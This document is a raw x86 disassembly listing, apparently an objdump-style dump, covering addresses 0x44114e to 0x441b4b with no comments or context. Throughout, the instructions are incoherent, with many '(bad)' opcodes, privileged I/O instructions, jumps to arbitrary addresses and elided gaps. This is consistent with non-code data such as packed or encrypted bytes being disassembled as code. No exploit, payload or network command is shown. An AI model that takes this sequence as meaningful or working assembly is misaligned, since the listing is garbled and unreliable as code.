  44114e:	les    ecx,FWORD PTR [ebx-0x26]
  441151:	ins    DWORD PTR es:[edi],dx
  441152:	mov    al,BYTE PTR [ebx+0x2edde02c]
  441158:	cmp    BYTE PTR [ebp+0x6070d7f6],cl
  44115e:	jno    0x441136
  441160:	aam    0x3
  441162:	sbb    eax,DWORD PTR [eax-0x19]
  441165:	mov    esi,cs
  441167:	xlat   BYTE PTR ds:[ebx]
  441168:	data16 fist DWORD PTR [esp+ecx*2+0x7]
  44116d:	(bad)  
  44116e:	push   ss
  44116f:	add    al,0xf6
  441171:	inc    ebx
  441172:	or     eax,0x4d883ad7
  441177:	dec    ebx
  441178:	clc    
  441179:	loop   0x4411d7
  44117b:	mov    BYTE PTR [ecx+0x2f82d407],ch
  441181:	loop   0x44112b
  441183:	leave  
  441184:	add    BYTE PTR [esi],dh
  441186:	int3   
  441187:	jl     0x44116c
  441189:	mov    WORD PTR [ebx+0x7c],ss
  44118c:	inc    ebx
  44118d:	and    DWORD PTR [ebx+0x4cbefc32],eax
  441193:	jnp    0x441178
  441195:	mov    ah,0xcb
  441197:	(bad)  
  441198:	int3   
  441199:	sbb    eax,0x35ccc4ca
  44119e:	ret    0xccc4
  4411a1:	sub    eax,0x9cccc4da
  4411a6:	xchg   ebx,eax
  4411a7:	in     al,0x52
  4411a9:	bound  esi,QWORD PTR ds:0xbb2d04
	...
  4411cb:	add    BYTE PTR [eax-0x189b0638],cl
  4411d1:	dec    esp
  4411d2:	(bad)  
  4411d3:	popa   
  4411d4:	(bad)  
  4411d5:	jl     0x441222
  4411d7:	icebp  
  4411d8:	xchg   ecx,eax
  4411d9:	fld    QWORD PTR [eax]
  4411db:	cmp    eax,0xf3743eb5
  4411e0:	push   edi
  4411e1:	push   ecx
  4411e2:	cs jo  0x4411f0
  4411e5:	add    BYTE PTR [eax],al
  4411e7:	jmp    0xe8fb0f95
  4411ec:	push   cs
  4411ed:	add    BYTE PTR [eax],al
  4411ef:	xchg   edx,eax
  4411f0:	adc    esp,DWORD PTR [ebx]
  4411f2:	(bad)  
  4411f3:	ins    BYTE PTR es:[edi],dx
  4411f4:	mov    ebx,0x8838224c
  4411f9:	dec    ecx
  4411fa:	adc    BYTE PTR [edx+ecx*8-0x15],dh
  4411fe:	dec    edi
  4411ff:	sbb    BYTE PTR [ebx],ah
  441201:	xlat   BYTE PTR ds:[ebx]
  441202:	adc    ebp,ecx
  441204:	pop    eax
  441205:	adc    eax,0xd7396a00
  44120a:	jae    0x441202
  44120c:	ins    DWORD PTR es:[edi],dx
  44120d:	icebp  
  44120e:	or     edi,edx
  441210:	into   
  441211:	inc    DWORD PTR [esi-0x37acf551]
  441217:	dec    esi
  441218:	iret   
  441219:	cmp    BYTE PTR [ebp+0x56c13700],bh
  44121f:	pop    ebp
  441220:	imul   DWORD PTR [edi-0x7b7e3334]
  441226:	in     al,dx
  441227:	push   esi
  441228:	add    DWORD PTR [ebp+esi*2-0x84e58f4],0xffffff85
	...
  44124c:	add    BYTE PTR [eax],al
  44124e:	sub    edi,DWORD PTR [eax]
  441250:	adc    ecx,DWORD PTR [ebx+0x74c07df3]
  441256:	in     eax,dx
  441257:	adc    bh,dh
  441259:	adc    eax,0x39cbe0
  44125e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44125f:	mov    dh,0x4f
  441261:	push   0xfffffff4
  441263:	fisttp WORD PTR ds:0x3af820
  441269:	and    DWORD PTR [eax+0x728b5708],0x3e
  441270:	push   ebp
  441271:	ret    
  441272:	add    DWORD PTR [ebx-0xfe67414],eax
  441278:	jp     0x441242
  44127a:	retf   
  44127b:	jge    0x44123e
  44127d:	je     0x441236
  44127f:	cmp    DWORD PTR [ecx],0x4
  441282:	stc    
  441283:	mov    edx,0xc478cccc
  441288:	int3   
  441289:	int3   
  44128a:	pop    eax
  44128b:	(bad)  
  44128c:	int3   
  44128d:	int3   
  44128e:	mov    eax,0x41ccccc4
  441293:	sub    esp,0xffffff8b
  441296:	xor    DWORD PTR [edi+edi*4],eax
  441299:	add    ah,al
  44129b:	xlat   BYTE PTR ds:[ebx]
  44129c:	cmp    al,0x0
  44129e:	mov    bl,0x40
  4412a0:	add    al,0x0
  4412a2:	cmp    al,0x3b
  4412a4:	add    bh,al
  4412a6:	and    al,0x4
  4412a8:	push   eax
  4412a9:	sbb    BYTE PTR [edi+0x3840bf00],ah
  4412af:	mov    al,ds:0x4318
	...
  4412d0:	or     eax,0x1d40c8e7
  4412d5:	xlat   BYTE PTR ds:[ebx]
  4412d6:	idiv   BYTE PTR [ecx*1-0x62ebc2da]
  4412dd:	fild   WORD PTR [eax+eax*1+0x4a]
  4412e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4412e2:	cmc    
  4412e3:	lahf   
  4412e4:	hlt    
  4412e5:	test   eax,0xfacdc0fd
  4412ea:	add    eax,DWORD PTR [eax]
  4412ec:	or     eax,0x9be3ae9
  4412f1:	jmp    0xf60ddfbf
  4412f6:	enter  0xc1cc,0xd
  4412fa:	leave  
  4412fb:	int3   
  4412fc:	fldenv ds:0x76d1ccc9
  441302:	mov    WORD PTR [ecx-0x7],ds
  441305:	push   0x34
  441307:	call   0x482f64
  44130c:	xchg   esi,eax
  44130d:	ss clc 
  44130f:	test   BYTE PTR [edx-0x27],cl
  441312:	jle    0x4412d8
  441314:	adc    esi,ebp
  441316:	shl    DWORD PTR [edx+0xf],cl
  441319:	dec    esi
  44131a:	aam    0x83
  44131c:	mov    ds:0x4e852c0d,eax
  441321:	mov    ecx,0xeb094986
  441326:	xor    ecx,DWORD PTR [edi-0x5b]
  441329:	xchg   ebp,eax
  44132a:	inc    ebx
  44132b:	add    BYTE PTR ds:0xc0c52e8,cl
  441331:	div    bl
  441333:	inc    BYTE PTR [eax]
	...
  441351:	add    BYTE PTR [ebx],al
  441353:	int    0x2c
  441355:	jno    0x441374
  441357:	enterw 0x340c,0xd6
  44135c:	icebp  
  44135d:	jb     0x44136a
  44135f:	pop    esi
  441360:	sub    eax,0xf3f68408
  441365:	pop    ecx
  441366:	mov    dh,0xff
  441368:	and    eax,0x2bc459d0
  44136d:	rcl    BYTE PTR [ecx-0x3c],1
  441370:	mov    esp,0x5e2a298a
  441375:	pop    ecx
  441376:	add    eax,0x910f397d
  44137b:	mov    esi,0x870d03e7
  441380:	test   eax,0xdac08fff
  441385:	xchg   DWORD PTR [eax+eax*1-0x19],ebx
  441389:	add    ebx,DWORD PTR [edi+eax*4-0x61]
  44138d:	pop    es
  44138e:	adc    bl,0xbd
  441391:	push   edi
  441392:	sub    DWORD PTR [edi+0xa],edi
  441395:	dec    ecx
  441396:	jns    0x4413b3
  441398:	data16 fist WORD PTR [edx+0x4c]
  44139c:	lds    eax,FWORD PTR [edx+0x7b36e4]
  4413a2:	pop    eax
  4413a3:	rol    DWORD PTR [edx-0x1d810aa9],cl
  4413a9:	push   esp
  4413aa:	inc    ecx
  4413ab:	out    dx,eax
  4413ac:	ficomp WORD PTR [bp+di-0x1903]
  4413b1:	add    eax,DWORD PTR [ecx+0x7]
  4413b4:	sub    bl,BYTE PTR [eax+eax*1+0x0]
	...
  4413d3:	add    BYTE PTR [edi+0x47dec2d2],dh
  4413d9:	xor    eax,0x870d07a5
  4413de:	daa    
  4413df:	or     al,0x8e
  4413e1:	mov    edi,0x41881133
  4413e6:	retf   
  4413e7:	xor    edx,DWORD PTR [eax-0x7bcc30c7]
  4413ed:	mov    al,0x66
  4413ef:	mov    DWORD PTR ds:0x88003187,0x4d892b3d
  4413f9:	dec    ebx
  4413fa:	in     al,dx
  4413fb:	mov    dl,bh
  4413fd:	sbb    eax,DWORD PTR [eax]
  4413ff:	sbb    DWORD PTR [esi+0x3219283d],eax
  441405:	ret    0x2d7d
  441408:	push   ss
  441409:	jge    0x44145d
  44140b:	std    
  44140c:	xchg   edi,eax
  44140d:	adc    DWORD PTR [eax+0x6c],eax
  441410:	dec    esi
  441411:	dec    ebx
  441412:	or     esp,DWORD PTR [edx-0x40]
  441415:	sbb    edx,DWORD PTR [eax+0x72]
  441418:	shl    BYTE PTR [edi],1
  44141a:	push   eax
  44141b:	ds pop ecx
  44141d:	push   esp
  44141e:	(bad)
  441422:	sbb    al,0x62
  441424:	int3   
  441425:	pop    ss
  441426:	sub    DWORD PTR [ecx],0x62
  441429:	add    eax,0x302aaf85
  44142e:	test   DWORD PTR [edi+0x38f93026],ebp
  441434:	(bad)  
  441435:	mov    esp,0x7208
	...
  441456:	and    ah,dh
  441458:	test   BYTE PTR [edi-0x32b584ca],ah
  44145e:	sbb    al,0x30
  441460:	stc    
  441461:	sbb    BYTE PTR [edi-0x2ee5f744],cl
  441467:	push   ebx
  441468:	stc    
  441469:	pop    eax
  44146a:	adc    BYTE PTR [ebp-0x40],ch
  44146d:	sar    BYTE PTR ss:[esi],1
  441470:	sbb    al,0xe9
  441472:	push   cs
  441473:	add    BYTE PTR [eax],al
  441475:	daa    
  441476:	pop    ecx
  441477:	push   ebx
  441478:	loopne 0x441436
  44147a:	loop   0x44140d
  44147c:	add    al,0xe9
  44147e:	jbe    0x441456
  441480:	stc    
  441481:	scas   al,BYTE PTR es:[edi]
  441482:	mov    al,0x36
  441484:	pop    ebx
  441485:	stos   DWORD PTR es:[edi],eax
  441486:	adc    eax,0x5dadcc00
  44148b:	(bad)  
  44148c:	int3   
  44148d:	(bad)  
  44148f:	sti    
  441490:	push   eax
  441491:	bound  edx,QWORD PTR [ecx+0xb]
  441494:	test   DWORD PTR [eax],0xf982ff6a
  44149a:	jmp    0x97488251
  44149f:	mov    ebp,0xbc4fc357
  4414a4:	add    DWORD PTR [esi+0x38],0x8456fe88
  4414ab:	adc    al,ch
  4414ad:	lods   eax,DWORD PTR ds:[esi]
  4414ae:	fs std 
  4414b0:	dec    DWORD PTR [edx+0x4184d192]
  4414b6:	sub    al,0x80
  4414b8:	les    ecx,FWORD PTR [eax+eax*1]
	...
  4414d7:	add    BYTE PTR [edi+0x3b74f9b3],dh
  4414dd:	mov    BYTE PTR [esi+0x30],cl
  4414e0:	jnp    0x4414f2
  4414e2:	dec    edx
  4414e3:	call   0x4407c0
  4414e8:	cmc    
  4414e9:	repnz clc 
  4414eb:	jge    0x4414d9
  4414ed:	test   DWORD PTR [esi],edi
  4414ef:	xor    BYTE PTR [edi-0x45],ch
  4414f2:	push   edi
  4414f3:	ret    
  4414f4:	ja     0x4414aa
  4414f6:	cli    
  4414f7:	je     0x4414eb
  4414f9:	xchg   DWORD PTR [esi],edi
  4414fb:	xor    BYTE PTR [ebx+0xf],bh
  4414fe:	push   eax
  4414ff:	call   0x442fc0
  441504:	cmp    eax,0x2201303b
  441509:	std    
  44150a:	jne    0x441514
  44150c:	das    
  44150d:	mov    esp,0xc090c357
  441512:	int3   
  441513:	int3   
  441514:	pusha  
  441515:	ror    ah,0xcc
  441518:	jo     0x4414da
  44151a:	int3   
  44151b:	int3   
  44151c:	stc    
  44151d:	xchg   ah,ch
  44151f:	push   ecx
  441520:	test   DWORD PTR [esi-0x7ab5d3a9],0xf99ffc55
  44152a:	cmp    bh,0xd
  44152d:	pop    esi
  44152e:	cmp    bh,ah
  441530:	xchg   cl,ch
  441532:	pop    ds
  441533:	and    eax,0x4188d2e2
  441538:	icebp  
  441539:	dec    ebp
  44153a:	dec    esp
  44153b:	sub    al,0x0
	...
  441559:	add    BYTE PTR [eax+0x53f60832],cl
  44155f:	popa   
  441560:	fsub   QWORD PTR ds:0x6ebe1d3d
  441566:	loopne 0x4415b5
  441568:	inc    esp
  441569:	cmp    dh,bl
  44156b:	pop    ebx
  44156c:	or     DWORD PTR [eax],ebx
  44156e:	fcom   QWORD PTR [esi-0x1932dd1b]
  441574:	std    
  441575:	test   BYTE PTR [edx-0x2ebe775e],bh
  44157b:	(bad)  
  44157c:	cmp    dh,BYTE PTR [eax-0x1c]
  44157f:	sub    DWORD PTR [ecx+0x7d],0x5926d5d1
  441586:	popa   
  441587:	pop    esp
  441588:	or     DWORD PTR [eax-0x63],edx
  44158b:	out    0x94,al
  44158d:	aas    
  44158e:	repz pop edx
  441590:	out    0xfe,al
  441592:	daa    
  441593:	sbb    cl,BYTE PTR [edi+0x4]
  441596:	ss sbb ch,al
  441599:	(bad)  
  44159a:	pop    ds
  44159b:	sbb    DWORD PTR [edi+0x62],eax
  44159e:	test   al,bl
  4415a0:	push   edx
  4415a1:	out    0x96,eax
  4415a3:	push   ss
  4415a4:	inc    esp
  4415a5:	test   esi,ebx
  4415a7:	pop    esp
  4415a8:	or     BYTE PTR [edi-0x63],dl
  4415ab:	out    0x8e,al
  4415ad:	aas    
  4415ae:	mov    bl,0x5a
  4415b0:	jmp    0x4415b0
  4415b2:	out    0x99,eax
  4415b4:	push   edx
  4415b5:	add    al,0xf6
  4415b7:	cdq    
  4415b8:	jmp    0x4adcf5bb
  4415bd:	bound  eax,QWORD PTR [eax]
	...
  4415db:	add    BYTE PTR [eax+ebx*8+0xee750],al
  4415e2:	xchg   esi,eax
  4415e3:	(bad)  
  4415e4:	or     al,0x83
  4415e6:	pop    ds
  4415e7:	add    BYTE PTR ds:0xd946aff,cl
  4415ed:	add    bh,ah
  4415ef:	mov    es,esp
  4415f1:	push   ebx
  4415f2:	out    0x3a,al
  4415f4:	icebp  
  4415f5:	jp     0x4415a0
  4415f7:	pop    es
  4415f8:	mov    ah,0x7
  4415fa:	pop    esi
  4415fb:	aam    0x65
  4415fd:	fldcw  WORD PTR [ecx-0x25]
  441600:	inc    esp
  441601:	add    DWORD PTR [edx-0x2cb877b1],ebp
  441607:	mov    ?,WORD PTR [esp+edx*4-0x7]
  44160b:	add    ecx,DWORD PTR ds:0xa801f37d
  441611:	leave  
  441612:	out    0x55,al
  441614:	sahf   
  441615:	jp     0x4415a9
  441617:	addr16 nop
  441619:	das    
  44161a:	out    dx,eax
  44161b:	mov    es,esp
  44161d:	daa    
  44161e:	(bad)  
  44161f:	mov    cl,0x14
  441621:	xchg   esi,eax
  441622:	jmp    0x44161a
  441624:	mov    eax,DWORD PTR [esi-0x51]
  441627:	mov    dh,0xed
  441629:	(bad)  
  44162a:	pop    eax
  44162b:	dec    eax
  44162c:	add    BYTE PTR [ecx],al
  44162e:	(bad)  
  44162f:	les    ecx,FWORD PTR [eax]
  441631:	inc    edi
  441632:	fwait
  441633:	mov    WORD PTR [eax+edi*1+0x64],cs
  441637:	shl    BYTE PTR [ecx+0x30],cl
  44163a:	pop    esi
  44163b:	push   ebx
  44163c:	inc    ebp
  44163d:	jnp    0x4415d9
  44163f:	cmp    eax,DWORD PTR [eax]
	...
  44165d:	add    BYTE PTR [eax+0x7f0b1f46],dl
  441663:	inc    ebx
  441664:	test   DWORD PTR ds:0xb7272e90,0x401a7aaf
  44166e:	clc    
  44166f:	lds    eax,FWORD PTR [esi]
  441671:	inc    ebx
  441672:	cmp    DWORD PTR [ebx+0x32],edi
  441675:	adc    BYTE PTR [edx+0x2f210046],dl
  44167b:	test   DWORD PTR [eax+ebp*1],eax
  44167e:	xor    bl,dh
  441680:	bound  esi,QWORD PTR [eax-0x7e]
  441683:	pop    ebx
  441684:	test   DWORD PTR [esi],ebp
  441686:	leave  
  441687:	test   BYTE PTR [ecx+0x2d],al
  44168a:	out    dx,eax
  44168b:	xchg   BYTE PTR [ecx+eiz*1],dl
  44168e:	inc    esi
  44168f:	js     0x441645
  441691:	fisttp WORD PTR [esi]
  441693:	add    BYTE PTR [ebp-0xe759a],al
  441699:	call   0xeab84f21
  44169e:	push   esi
  44169f:	or     eax,0x5e0b607d
  4416a4:	add    al,0x64
  4416a6:	dec    esi
  4416a7:	push   edx
  4416a8:	mov    al,0x68
  4416aa:	xlat   BYTE PTR ds:[ebx]
  4416ab:	push   ebx
  4416ac:	add    ch,al
  4416ae:	push   cs
  4416af:	add    BYTE PTR [ebp-0xb],ch
  4416b2:	xchg   ebx,eax
  4416b3:	lock jl 0x441679
  4416b6:	sbb    cl,dh
  4416b8:	or     ch,BYTE PTR [ebx+eax*2-0x37]
  4416bc:	stc    
  4416bd:	cs fwait
  4416bf:	jg     0x441681
  4416c1:	inc    DWORD PTR [eax]
	...
  4416df:	add    BYTE PTR [esi],cl
  4416e1:	add    BYTE PTR [ebp-0x40ecdd52],al
  4416e7:	call   0x4f13:0x9571836f
  4416ee:	ins    BYTE PTR es:[edi],dx
  4416ef:	ret    0x5bcc
  4416f2:	sub    dl,dl
  4416f4:	les    eax,FWORD PTR [ebx-0x314c9729]
  4416fa:	add    cl,ch
  4416fc:	push   cs
  4416fd:	push   edx
  4416fe:	add    esp,DWORD PTR [edx-0x160632f5]
  441704:	mov    DWORD PTR [edi],edi
  441706:	cmp    dl,ch
  441708:	int3   
  441709:	cmp    edx,DWORD PTR [eax-0x3f]
  44170c:	or     al,0x7
  44170e:	add    BYTE PTR [eax],al
  441710:	mov    ah,0x84
  441712:	les    ecx,FWORD PTR [eax]
  441714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441715:	xchg   DWORD PTR [esi-0x77],edx
  441718:	cmp    eax,esp
  44171a:	push   cs
  44171b:	add    BYTE PTR [esp+ecx*1-0x7d],dh
  44171f:	in     eax,0xc9
  441721:	ret    0x9685
  441724:	data16 add al,BYTE PTR [eax]
  441727:	add    BYTE PTR [edi-0x3d],bl
  44172a:	imul   esp,DWORD PTR ds:0xc679b14f,0x76
  441731:	add    al,BYTE PTR [eax]
  441733:	add    BYTE PTR [edi],bh
  441735:	mov    ecx,0x352f133
  44173a:	xor    ecx,0xffffffaf
  44173d:	cmp    BYTE PTR ss:[ebx],al
  441740:	cld    
  441741:	adc    DWORD PTR [ecx-0x18],ecx
	...
  441760:	add    BYTE PTR [eax],al
  441762:	hlt    
  441763:	jmp    0xbfec1767
  441768:	or     BYTE PTR [ecx],al
  44176a:	add    esp,0xe
  44176d:	add    BYTE PTR [edi+eax*1],dh
  441770:	push   ebx
  441771:	mov    edx,ecx
  441773:	adc    al,0xbb
  441775:	int3   
  441776:	jno    0x4417f4
  441778:	in     al,dx
  441779:	push   ecx
  44177a:	mov    ds:0x7f086d7b,al
  44177f:	inc    edx
  441780:	or     al,0x83
  441782:	and    al,0xab
  441784:	dec    edi
  441785:	(bad)  
  441786:	mov    eax,ds:0xf4fff7b4
  44178b:	add    BYTE PTR ds:0x40bff,dh
  441791:	jae    0x44177a
  441793:	jns    0x4417d2
  441795:	cld    
  441796:	outs   dx,DWORD PTR ds:[esi]
  441797:	inc    edx
  441798:	je     0x44171d
  44179a:	mov    esp,0x3f126f01
  44179f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4417a0:	call   0xf7ebf1b6
  4417a5:	mov    ecx,DWORD PTR ds:0xcd83501d
  4417ab:	lods   eax,DWORD PTR ds:[esi]
  4417ac:	jns    0x441756
  4417ae:	or     eax,0x50fefdd7
  4417b3:	cmp    ecx,DWORD PTR [ebx+0x3a62314a]
  4417b9:	cld    
  4417ba:	xchg   esi,eax
  4417bb:	hlt    
  4417bc:	addr16 ror ebx,0xea
  4417c0:	add    eax,DWORD PTR [eax]
  4417c2:	or     eax,0x482d7
	...
  4417e3:	add    BYTE PTR [ebx+ebp*8],cl
  4417e6:	push   DWORD PTR [edi*1+0x3d2514e8]
  4417ed:	dec    edi
  4417ee:	das    
  4417ef:	je     0x441775
  4417f1:	and    al,0x68
  4417f3:	add    DWORD PTR [esi+ecx*8+0x0],0xffffff85
  4417f8:	jecxz  0x441788
  4417fa:	add    al,0xcf
  4417fc:	fcom   DWORD PTR ss:[esi+ecx*8]
  441800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441801:	(bad)  
  441802:	sub    al,0xbf
  441804:	fisttp QWORD PTR [eax-0x109b17d1]
  44180a:	add    eax,DWORD PTR [eax]
  44180c:	xchg   esi,eax
  44180d:	xchg   esp,eax
  44180e:	popa   
  44180f:	test   ebx,ebx
  441811:	pop    ecx
  441812:	mov    ecx,0x31a48410
  441817:	call   0xfa1c3540
  44181c:	xchg   esi,eax
  44181d:	retf   
  44181e:	test   BYTE PTR [esi+0x1d],dh
  441821:	(bad)  [ecx+0x45]
  441824:	xchg   BYTE PTR [ebx+0x4d438531],ah
  44182a:	mov    WORD PTR [edx+0x31],es
  44182d:	scas   al,BYTE PTR es:[edi]
  44182e:	scas   al,BYTE PTR es:[edi]
  44182f:	sub    edx,DWORD PTR [ebx]
  441831:	fdivr  st,st(5)
  441833:	call   DWORD PTR [esi]
  441835:	jmp    0xda889641
  44183a:	sar    ecx,1
  44183c:	mov    BYTE PTR [eax],al
  44183e:	mov    al,0x5c
  441840:	or     al,0x77
  441842:	and    DWORD PTR [eax+esi*4],ebx
  441845:	sar    BYTE PTR [esi+0x2],0x0
	...
  441864:	add    BYTE PTR [eax],al
  441866:	clc    
  441867:	mov    edi,0x3053043d
  44186c:	sbb    esp,ebp
  44186e:	sub    ecx,DWORD PTR [ecx]
  441870:	out    0x3,eax
  441872:	mov    BYTE PTR [edx],bh
  441874:	inc    ebx
  441875:	mov    eax,DWORD PTR [edi+0x7f]
  441878:	mov    ds:0x433a8bf4,eax
  44187d:	in     al,dx
  44187e:	dec    ebx
  44187f:	(bad)  
  441880:	call   0xfd5a:0x65f288d7
  441887:	(bad)  
  441888:	fld    DWORD PTR [eax-0x287d3531]
  44188e:	mov    ah,0xe
  441890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441891:	ss mov ch,ah
  441894:	adc    al,0xc3
  441896:	nop
  441897:	inc    ebp
  441898:	fild   DWORD PTR [eax-0x40a7abb3]
  44189e:	(bad)  
  44189f:	xchg   esp,eax
  4418a0:	icebp  
  4418a1:	add    ecx,DWORD PTR ds:0xd03e700
  4418a7:	jg     0x4418f8
  4418a9:	add    BYTE PTR [esi-0x46b991c3],bl
  4418af:	test   BYTE PTR [eax],dh
  4418b1:	pop    esp
  4418b2:	or     al,0x77
  4418b4:	test   eax,0x3ec0081b
  4418b9:	add    dh,BYTE PTR [eax]
  4418bb:	shr    BYTE PTR [esi+0x2e],0x69
  4418bf:	push   esi
  4418c0:	call   0xb771daef
  4418c5:	sub    eax,0x3cfe8f5
	...
  4418e6:	add    BYTE PTR [eax],al
  4418e8:	or     eax,0x9067a977
  4418ed:	or     DWORD PTR [esi-0x40],esp
  4418f0:	std    
  4418f1:	js     0x4418f3
  4418f3:	scas   eax,DWORD PTR es:[edi]
  4418f4:	add    bl,al
  4418f6:	ja     0x4418ea
  4418f8:	fcmovne st,st(0)
  4418fa:	test   edi,esi
  4418fc:	pop    ds
  4418fd:	shl    BYTE PTR [edi],0x28
  441900:	mov    ecx,0xce7c0927
  441905:	and    eax,0x850ca97d
  44190a:	jecxz  0x441930
  44190c:	into   
  44190d:	test   BYTE PTR [edx+0x4d],al
  441910:	xchg   BYTE PTR ds:0x454cf25c,ch
  441916:	xor    esp,DWORD PTR [esp+edi*4+0x47]
  44191a:	add    DWORD PTR [edx-0x30],esi
  44191d:	pop    es
  44191e:	std    
  44191f:	mov    dl,0x67
  441921:	leave  
  441922:	mov    al,cs:0xab24fff4
  441928:	push   ds
  441929:	cmp    edx,DWORD PTR [edx-0x6f]
  44192c:	lahf   
  44192d:	pop    es
  44192e:	add    cl,ch
  441930:	xchg   DWORD PTR ds:0x4d20626c,ebp
  441936:	(bad)  
  441937:	fst    DWORD PTR [ecx+0x1f515c2d]
  44193d:	aad    0xf9
  44193f:	pop    esi
  441940:	xchg   ebp,edi
  441942:	jl     0x441915
  441944:	push   ds
  441945:	retf   0x650a
  441948:	test   eax,0x46f9c8
	...
  441969:	add    bl,ah
  44196b:	xchg   edi,edi
  44196d:	call   0x629e1980
  441972:	in     eax,dx
  441973:	and    eax,0xbcca1dbd
  441978:	int3   
  441979:	xor    eax,0x2dccbcd2
  44197e:	retf   0xccbc
  441981:	mov    esp,0xb74ddc97
  441986:	xchg   edi,eax
  441987:	dec    ebp
  441988:	or     BYTE PTR [eax],al
  44198a:	jnp    0x4419f2
  44198c:	stc    
  44198d:	jmp    esp
  44198f:	std    
  441990:	cmp    bh,0x2f
  441993:	or     esi,DWORD PTR [ebp+edi*1-0x56]
  441997:	add    al,0x0
  441999:	add    BYTE PTR [edi+0x1f],dl
  44199c:	cmp    esi,0xffffffdc
  44199f:	cmp    esp,0xffffffff
  4419a2:	ret    
  4419a3:	ja     0x4419e3
  4419a5:	je     0x4419b8
  4419a7:	retf   0xfffa
  4419aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4419ab:	xor    BYTE PTR [edx],al
  4419ad:	adc    ecx,0xfffffff7
  4419b0:	dec    DWORD PTR [esi]
  4419b2:	clc    
  4419b3:	cmp    edi,edx
  4419b5:	push   DWORD PTR [edx+ecx*2-0x40]
  4419b9:	psubsb mm1,QWORD PTR [edx]
  4419bc:	cli    
  4419bd:	jmp    DWORD PTR [eax+eax*4-0x8]
  4419c1:	add    eax,DWORD PTR [esi]
  4419c3:	pop    eax
  4419c4:	add    DWORD PTR [esi+0x2c],0x77
  4419c8:	inc    esi
  4419c9:	pop    eax
  4419ca:	fistp  WORD PTR [ecx]
  4419cc:	ins    BYTE PTR es:[edi],dx
  4419cd:	mov    eax,DWORD PTR [eax]
	...
  4419eb:	add    BYTE PTR [edx-0x7],dl
  4419ee:	retf   0xafe0
  4419f1:	inc    ecx
  4419f2:	cmp    BYTE PTR [edi],cl
  4419f4:	cli    
  4419f5:	aaa    
  4419f6:	or     DWORD PTR [edx],eax
  4419f8:	pop    ss
  4419f9:	mov    ebp,0x7878461b
  4419fe:	inc    esi
  4419ff:	inc    esp
  441a00:	pop    ss
  441a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441a02:	adc    DWORD PTR [esi+0x74],0x76
  441a06:	ds dec eax
  441a08:	dec    edx
  441a09:	js     0x441a0f
  441a0b:	inc    ecx
  441a0c:	dec    edx
  441a0d:	jbe    0x441a13
  441a0f:	jp     0x441a80
  441a11:	inc    edx
  441a12:	ins    BYTE PTR es:[edi],dx
  441a13:	and    esp,DWORD PTR [edx-0x5ba97d08]
  441a19:	add    ebp,DWORD PTR [edi+0x4677be04]
  441a1f:	dec    eax
  441a20:	or     eax,0x6b442a5e
  441a25:	pop    esi
  441a26:	push   edx
  441a27:	ins    BYTE PTR es:[edi],dx
  441a28:	jae    0x441a7a
  441a2a:	sbb    BYTE PTR [esi-0x78],al
  441a2d:	push   ss
  441a2e:	push   eax
  441a2f:	sbb    DWORD PTR [esi+0x5b8561a0],edx
  441a35:	mov    ebp,DWORD PTR [eax]
  441a37:	enter  0xac8c,0xfb
  441a3b:	(bad)  
  441a3c:	mov    dl,0xd6
  441a3e:	sbb    dh,al
  441a40:	and    ah,ah
  441a42:	sub    eax,0x117eb552
  441a47:	add    BYTE PTR ds:0x8408b956,cl
  441a4d:	and    BYTE PTR [ebp+edi*2+0x0],ah
	...
  441a6d:	add    BYTE PTR [ebx],cl
  441a6f:	aaa    
  441a70:	dec    DWORD PTR [eax]
  441a72:	pop    DWORD PTR [ebx]
  441a74:	std    
  441a75:	dec    DWORD PTR ds:0xe14a86f9
  441a7b:	add    BYTE PTR [edi],ah
  441a7d:	dec    edx
  441a7e:	fstp   QWORD PTR [ebp+0x6b]
  441a81:	mov    al,ds:0x85fdd6fb
  441a86:	shl    esi,cl
  441a88:	xchg   BYTE PTR [edx-0x24f57],bh
  441a8e:	sbb    cl,BYTE PTR [edx]
  441a90:	(bad)  
  441a91:	bound  edx,QWORD PTR [edx+ebp*4+0x7ea3852c]
  441a98:	jmp    0x441a99
  441a9a:	xor    cl,BYTE PTR [ebp-0x6d]
  441a9d:	mov    al,ds:0x2bfdd703
  441aa2:	push   cs
  441aa3:	pop    edi
  441aa4:	stc    
  441aa5:	xor    eax,0x129d610c
  441aaa:	or     eax,0xcdb204d7
  441aaf:	fimul  WORD PTR [ebx+0x3da3fd90]
  441ab5:	add    BYTE PTR [ebx+0x0],dh
  441ab8:	call   0xe3acba34
  441abd:	add    ecx,DWORD PTR ds:0x856d6b75
  441ac3:	cld    
  441ac4:	out    0x3,al
  441ac6:	pop    edx
  441ac7:	rol    DWORD PTR [edx],0xd4
  441aca:	or     eax,0xca033f00
  441acf:	(bad)  
  441ad0:	out    0x5d,eax
	...
  441aee:	add    BYTE PTR [eax],al
  441af0:	clc    
  441af1:	mov    bh,0x76
  441af3:	pop    es
  441af4:	add    al,0x8f
  441af6:	mov    al,0x3
  441af8:	jg     0x441a7b
  441afa:	xlat   BYTE PTR ds:[ebx]
  441afb:	cmp    al,0x4d
  441afd:	add    BYTE PTR [esi-0x4770ebff],bh
  441b03:	lds    esi,FWORD PTR [ebx+0x1399f1ff]
  441b09:	shl    BYTE PTR [eax],1
  441b0b:	inc    esp
  441b0c:	or     eax,0x8f6fe85e
  441b11:	js     0x441af3
  441b13:	add    ecx,DWORD PTR ds:0x1f70697b
  441b19:	add    bh,ah
  441b1b:	push   ss
  441b1c:	push   edx
  441b1d:	sbb    esp,DWORD PTR [esi-0xe5f70f3]
  441b23:	add    ecx,DWORD PTR ds:0x464297b
  441b29:	ins    BYTE PTR es:[edi],dx
  441b2a:	test   al,0x1d
  441b2c:	iret   
  441b2d:	dec    ebx
  441b2e:	pop    esi
  441b2f:	int    0x88
  441b31:	ss repz push cs
  441b34:	pop    DWORD PTR [eax+0x4f0d03e7]
  441b3a:	mov    dl,0x86
  441b3c:	and    al,BYTE PTR [ebx]
  441b3e:	aad    0x35
  441b40:	aad    0x78
  441b42:	mov    eax,ds:0xd3251a63
  441b47:	jle    0x441b08
  441b49:	push   ebx
  441b4a:	outs   dx,BYTE PTR ds:[esi]
  441b4b:	xor    dl,BYTE PTR [ebp+0x7b]
